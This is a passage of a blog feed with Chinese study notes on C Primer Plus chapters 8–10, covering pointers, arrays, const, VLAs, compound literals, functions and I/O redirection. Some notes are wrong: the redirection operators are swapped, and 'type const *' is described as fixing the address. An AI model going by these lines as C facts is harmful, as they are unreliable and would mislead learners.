&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;103-指针和数组&#34;&gt;10.3 指针和数组
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;数组名是数组首元素的地址&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;arr == &amp;amp;arr[0];
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;指针的加减是它所指向类型的大小加减&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;104-函数数组和指针&#34;&gt;10.4 函数、数组和指针
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;int ar[]和int  *ar形式都表示ar是一个指向int的指针，但是，int ar[]只能用于声明形式参数，第二种可以改变数组内容。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;1041-使用指针形参&#34;&gt;10.4.1 使用指针形参
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;用函数处理数组
&lt;ol&gt;
&lt;li&gt;一个指针形参标识数组开始，另一个整数形参表示待处理数组元素个数。&lt;/li&gt;
&lt;li&gt;一个指针指向数组的开始处，另一个指向数组的结束处。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;C 保证在给数组分配空间时，指向数组后面第一个位置的指针仍是有效的指针。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;1042-指针表示法和数组表示法&#34;&gt;10.4.2 指针表示法和数组表示法
&lt;/h5&gt;&lt;hr&gt;
&lt;h3 id=&#34;105-指针基本操作&#34;&gt;10.5 指针基本操作
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;分别是：
&lt;ol&gt;
&lt;li&gt;赋值&lt;/li&gt;
&lt;li&gt;解引用&lt;/li&gt;
&lt;li&gt;取址&lt;/li&gt;
&lt;li&gt;指针和整数相加&lt;/li&gt;
&lt;li&gt;递增指针&lt;/li&gt;
&lt;li&gt;指针减去一个整数&lt;/li&gt;
&lt;li&gt;递减指针&lt;/li&gt;
&lt;li&gt;指针求差&lt;/li&gt;
&lt;li&gt;比较&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;C 只能保证指向数组任意元素的指针和指向数组后面第1个位置的指针有效。&lt;/li&gt;
&lt;li&gt;千万不要解引用未初始化的指针，否则可能会擦写数据或代码。&lt;/li&gt;
&lt;li&gt;指针的第一个基本用法是在函数间传递信息，第二个基本用法是用在处理数组的函数中。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;106-保护数组中的数据&#34;&gt;10.6 保护数组中的数据
&lt;/h3&gt;&lt;h5 id=&#34;1061-对形式参数使用const&#34;&gt;10.6.1 对形式参数使用const
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;不能修改数组中的数据内容，保护原始数据&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;1062-const的其他内容&#34;&gt;10.6.2 const的其他内容
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;const指针虽然不能修改其所指向的数据，但可以使其指向其他地址。&lt;/li&gt;
&lt;li&gt;把const数据或非const数据的地址初始化为指向const的指针或为其赋值时合法的。&lt;/li&gt;
&lt;li&gt;而普通指针只能被赋予非const数据的指针&lt;/li&gt;
&lt;li&gt;const 类型 * -&amp;gt; 定值，不可被修改&lt;/li&gt;
&lt;li&gt;类型 const * -&amp;gt; 定地址，不可被修改&lt;/li&gt;
&lt;li&gt;const 类型 *const -&amp;gt; 值与地址都不可被修改&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;107-指针和多维数组&#34;&gt;10.7 指针和多维数组
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;地址的地址或指针的指针就是双重间接的例子&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;int arr[4][2];
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;arr==&amp;amp;arr[0];
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;arr[0]==&amp;amp;arr[0][0];
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;最好用简单的数组表示法，而不是指针表示法。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;1071-指向多维数组的指针&#34;&gt;10.7.1 指向多维数组的指针
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;声明：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;int (* p)[2];   //p是指向一个内含两个int类型的数组的指针
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//而[]的优先级高于*，我们可以省去括号：
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//[]先和p结合成数组，然后*表示p内含指针
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;int * p[2];  //p是一个内含两个指针元素的数组，每个元素都指向int的指针
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;1072-指针的兼容性&#34;&gt;10.7.2 指针的兼容性
&lt;/h5&gt;&lt;h5 id=&#34;1073-函数和多维数组&#34;&gt;10.7.3 函数和多维数组
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;如果arr是二维数组，arr[]就是一维数组，可将其视为二维数组的一行&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一般而言，声明一个指向N维数组的指针时，只能省略最左边方括号中的值：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;int sum4d(int arr[][20][30][15] , int rows );
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;108-变长数组vla&#34;&gt;10.8 变长数组（VLA）
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;C99新增了变长数组(variable-length array，VLA),允许使用变量表示数组的维度，如下:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;int quarter = 4;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;int regions = 5;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;double VLA[quarter][regions]；  //一个变长数组VLA
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;变长数组不能改变大小，这里的“变”的意思是：在创建数组时，可以使用变量指定数组的维度。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;声明一个带二维变长数组参数的函数，要注意顺序：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;int sun2d(int rows, int cols,int ar[rows][cols] );
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;变长数组还允许动态内存分配，可在程序运行时指定数组大小。普通的C数组都是静态内存分配，即在编译时确定数组大小。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;109-复合字面量&#34;&gt;10.9 复合字面量
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;C99新增了复合字面量(compound literal),字面量是除符号常量外的常量。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;int diva[2] = {10,20};  //一个普通的数组声明
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;(int [2]) {10,20}   //复合字面量
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;(int []) {10,20} //复合字面量也可以省略大小，编译器自动计算
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;因为复合字面量是匿名的，所以不呢个先创建后使用它，必须在创建的同时使用它。使用指针记录就是一种用法：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;int *pl;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pl = (int []) {10,20}; //这个与diva数组完全相同
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;1010-关键概念&#34;&gt;10.10 关键概念
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;数组用于储存相同类型的数据，C把数组看作是派生类型&lt;/li&gt;
&lt;li&gt;在把数组名作为实际参数时，传递给函数的不是整个数组，而是数组的地址。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>《C Prime Plus》第九节笔记</title>
        <link>https://dorinxl.github.io/p/c-prime-plus%E7%AC%AC%E4%B9%9D%E8%8A%82%E7%AC%94%E8%AE%B0/</link>
        <pubDate>Wed, 06 Nov 2019 02:39:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/c-prime-plus%E7%AC%AC%E4%B9%9D%E8%8A%82%E7%AC%94%E8%AE%B0/</guid>
        <description>&lt;h1 id=&#34;第九节-函数&#34;&gt;第九节 函数
&lt;/h1&gt;&lt;hr&gt;
&lt;h3 id=&#34;91-复习函数&#34;&gt;9.1 复习函数
&lt;/h3&gt;&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;函数原型 &lt;em&gt;function prototype&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;函数调用 &lt;em&gt;function call&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;函数定义 &lt;em&gt;function definition&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;形参 实参&lt;/li&gt;
&lt;li&gt;典型的ANSI C函数的定义：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    返回类型 名称（形参声明列表）
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr&gt;
&lt;h3 id=&#34;92-ansi-c函数原型&#34;&gt;9.2 ANSI C函数原型
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;主调函数把它的参数储存在被称为栈(stack)的临时储存区&lt;/li&gt;
&lt;li&gt;错误导致无法编译，而警告仍然允许编译&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;93-递归&#34;&gt;9.3 递归
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;printf使用%p打印地址&lt;/li&gt;
&lt;li&gt;递归的优缺点&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   1.优点是递归为某些编程问题提供了最简单的解决方案
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   2.缺点是递归算法会快速消耗计算机的内存资源
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr&gt;
&lt;h3 id=&#34;94-编译多源代码文件的程序&#34;&gt;9.4 编译多源代码文件的程序
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;scanf(&amp;quot;%*s&amp;quot;)跳至下一个空白字符&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;95-查找地址运算符&#34;&gt;9.5 查找地址：&amp;amp;运算符
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;一元运算符&amp;amp;给出变量的存储地址&lt;/li&gt;
&lt;li&gt;PC地址通常用十六进制形式表示，每个十六进制对应四位&lt;/li&gt;
&lt;li&gt;%p是输出地址的转换说明&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;96-更改主调函数中的变量&#34;&gt;9.6 更改主调函数中的变量
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;典型例子：用函数交换两个值&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;97-指针简介&#34;&gt;9.7 指针简介
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;指针(pointer)是一个值为内存地址的变量(或数据对象)&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;971-简介运算符-&#34;&gt;9.7.1 简介运算符 *
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;使用间接运算符(indirection operator)找出内存地址所对应的值，又是也称为解引用运算符(dereferencing operator)&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;972-声明指针&#34;&gt;9.7.2 声明指针
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;指针是一个新类型，需要声明指针所指变量的类型&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    int * pi;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    char * pc;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    float * pf,* pg;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h5 id=&#34;973-使用指针在函数间通信&#34;&gt;9.7.3 使用指针在函数间通信
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;函数无法直接访问其他函数中的变量，这种限制访问保护了数据的完整性。但是，当确实需要在函数中访问另一个函数的数据时，可以把指针作为函数的参数。&lt;/li&gt;
&lt;li&gt;如果需要在被调函数中修改主调函数的变量，使用地址或指针作为参数。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>《C Prime Plus》第八节笔记</title>
        <link>https://dorinxl.github.io/p/c-prime-plus%E7%AC%AC%E5%85%AB%E8%8A%82%E7%AC%94%E8%AE%B0/</link>
        <pubDate>Wed, 06 Nov 2019 02:36:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/c-prime-plus%E7%AC%AC%E5%85%AB%E8%8A%82%E7%AC%94%E8%AE%B0/</guid>
        <description>&lt;h1 id=&#34;第八节-字符输入输出和输入验证&#34;&gt;第八节 字符输入/输出和输入验证
&lt;/h1&gt;&lt;h3 id=&#34;81-单字符iogetchar和putchar&#34;&gt;8.1 单字符I/O：getchar()和putchar()
&lt;/h3&gt;&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;getchar()和putchar()包含在stdio.h头文件中&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;82-缓冲区&#34;&gt;8.2 缓冲区
&lt;/h3&gt;&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;无缓冲输入： 直接回复用户&lt;/li&gt;
&lt;li&gt;缓冲输入： 暂缓回复&lt;/li&gt;
&lt;li&gt;缓冲区：收集用户输入字符的临时存储区
&lt;ul&gt;
&lt;li&gt;节省时间&lt;/li&gt;
&lt;li&gt;可以修正输入&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;完全缓冲I/o：当缓冲区被填满时才刷新缓冲区&lt;/li&gt;
&lt;li&gt;行缓冲I/O：出现换行符时刷新缓冲区&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;83-结束键盘输入&#34;&gt;8.3 结束键盘输入
&lt;/h3&gt;&lt;hr&gt;
&lt;h5 id=&#34;831-文件流和键盘输入&#34;&gt;8.3.1 文件、流和键盘输入
&lt;/h5&gt;&lt;h5 id=&#34;832-文件结尾&#34;&gt;8.3.2 文件结尾
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;文件结尾的一种方法：在文件的末尾放置一个特殊的字符文件标记（ctrl+z)&lt;/li&gt;
&lt;li&gt;另一种方法：储存文件大小的信息&lt;/li&gt;
&lt;li&gt;getchar()和scanf()读取到文件末尾返回EOF
&lt;ul&gt;
&lt;li&gt;EOF在stdio.h中被预处理定义&lt;/li&gt;
&lt;li&gt;UNIX中Ctrl+D  PC中Ctrl+Z&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;84-重定向和文件&#34;&gt;8.4 重定向和文件
&lt;/h3&gt;&lt;hr&gt;
&lt;h5 id=&#34;841-unixlinux和dos的重定向&#34;&gt;8.4.1 UNIX、Linux和DOS的重定向
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;重定向输入让程序使用文件而不是程序输入&lt;/li&gt;
&lt;li&gt;重定向输出让程序输出到文件而不是屏幕
&lt;ul&gt;
&lt;li&gt;重定向输入 &amp;gt;&lt;/li&gt;
&lt;li&gt;重定向输出 &amp;lt;&lt;/li&gt;
&lt;li&gt;组合重定向 &amp;gt;输出文件 &amp;lt;输入文件&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;关于重定向的要求：
&lt;ul&gt;
&lt;li&gt;程序与文件放在同同一路径下&lt;/li&gt;
&lt;li&gt;cmd窗口使用时用cd指令来改变路径&lt;/li&gt;
&lt;li&gt;一对一原则&lt;/li&gt;
&lt;li&gt;&amp;laquo; 可以将字符加在文件之后而不覆盖&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;85-创建更友好的用户界面&#34;&gt;8.5 创建更友好的用户界面
&lt;/h3&gt;&lt;hr&gt;
&lt;h5 id=&#34;851-使用缓冲输入&#34;&gt;8.5.1 使用缓冲输入
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;考虑用户各种输入情况&lt;/li&gt;
&lt;li&gt;处理好输入结尾\n&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;852-混合数值和字符输入&#34;&gt;8.5.2 混合数值和字符输入
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;getchar()读取每个字符，包括空格、制表符和换行符，而scanf()则会跳过这些&lt;/li&gt;
&lt;li&gt;scanf()输入会返回数值，数值代表成功读取个数&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;86-输入验证&#34;&gt;8.6 输入验证
&lt;/h3&gt;&lt;hr&gt;
&lt;h5 id=&#34;861-分析程序&#34;&gt;8.6.1 分析程序
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;程序遵循模块化的编程思想，使用独立函数（模块）来验证输入和管理显示。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;862-输入流和数字&#34;&gt;8.6.2 输入流和数字
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;gatchar()和%c的scanf()可以接受所有的字符&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;87-菜单浏览&#34;&gt;8.7 菜单浏览
&lt;/h3&gt;&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;switch语句&lt;/li&gt;
&lt;li&gt;解决缓冲输入带来的麻烦，跳过多余输入和换行符&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
